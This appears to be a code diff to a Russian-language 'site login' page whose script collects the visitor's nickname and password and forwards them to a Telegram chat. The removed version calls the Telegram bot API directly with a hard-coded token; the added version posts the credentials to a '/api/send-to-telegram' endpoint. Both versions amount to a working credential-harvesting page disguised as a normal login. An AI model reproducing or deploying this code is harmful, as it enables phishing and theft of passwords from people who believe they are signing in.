@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Вход на сайт</title>
     <style>
-        /* Простые стили для красоты */
         body {
             font-family: Arial, sans-serif;
             display: flex;
@@ -58,15 +57,15 @@
         }
         .error {
             color: #e53e3e;
-            text-align: center;
-            margin-top: 10px;
+        }
+        .success {
+            color: #38a169;
         }
     </style>
 </head>
 <body>
     <div class="login-container">
         <h2>Вход на сайт</h2>
-        <!-- Форма ввода -->
         <form id="loginForm">
             <label for="username">Никнейм:</label>
             <input type="text" id="username" name="username" required placeholder="Введите ваш ник">
@@ -80,61 +79,39 @@
     </div>
 
     <script>
-        // НАСТРОЙКИ TELEGRAM (ЗАМЕНИТЕ НА СВОИ!)
-        const TELEGRAM_BOT_TOKEN = '7043524346:AAFY2BwMxrFp8v0LzH-JC9uRqe3l8yZ0'; // Пример: 7234567890:AAHdqTcvH1hC...
-        const TELEGRAM_CHAT_ID = '123456789'; // Пример: 123456789
-
-        // Функция отправки данных в Telegram
-        async function sendToTelegram(username, password) {
-            // Формируем сообщение. Символы %0A - это перенос строки
-            const message = `🔔 Новая попытка входа!%0A👤 Ник: ${username}%0A🔑 Пароль: ${password}`;
-            
-            // URL для отправки сообщения через бота
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${message}`;
-
-            try {
-                // Отправляем запрос к API Telegram
-                const response = await fetch(url);
-                const data = await response.json();
-                
-                if (data.ok) {
-                    return { success: true, message: 'Данные отправлены!' };
-                } else {
-                    return { success: false, message: 'Ошибка отправки в Telegram' };
-                }
-            } catch (error) {
-                console.error('Ошибка:', error);
-                return { success: false, message: 'Не удалось отправить данные' };
-            }
-        }
-
-        // Обработчик отправки формы
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
-            event.preventDefault(); // Отменяем стандартную отправку формы (чтобы страница не перезагружалась)
+            event.preventDefault();
             
-            // Получаем значения из полей ввода
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            // Простейшая проверка (чтобы не отправлять пустые строки)
             if (!username || !password) {
                 document.getElementById('message').innerHTML = '<span class="error">Заполните все поля!</span>';
                 return;
             }
 
-            // Показываем сообщение о процессе отправки
-            document.getElementById('message').innerText = 'Отправка...';
-            
-            // Отправляем данные в Telegram
-            const result = await sendToTelegram(username, password);
-            
-            // Показываем результат пользователю
-            if (result.success) {
-                document.getElementById('message').innerHTML = '<span style="color: #38a169;">✓ Данные отправлены владельцу!</span>';
-                // Очищаем форму после успеха (опционально)
-                // document.getElementById('loginForm').reset();
-            } else {
-                document.getElementById('message').innerHTML = `<span class="error">✗ ${result.message}</span>`;
+            document.getElementById('message').innerHTML = 'Отправка...';
+
+            try {
+                const response = await fetch('/api/send-to-telegram', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password })
+                });
+
+                const result = await response.json();
+
+                if (result.success) {
+                    document.getElementById('message').innerHTML = '<span class="success">✓ Данные отправлены владельцу!</span>';
+                    document.getElementById('username').value = '';
+                    document.getElementById('password').value = '';
+                } else {
+                    document.getElementById('message').innerHTML = '<span class="error">✗ Ошибка отправки</span>';
+                }
+            } catch (error) {
+                document.getElementById('message').innerHTML = '<span class="error">✗ Ошибка соединения</span>';
             }
         });
     </script>
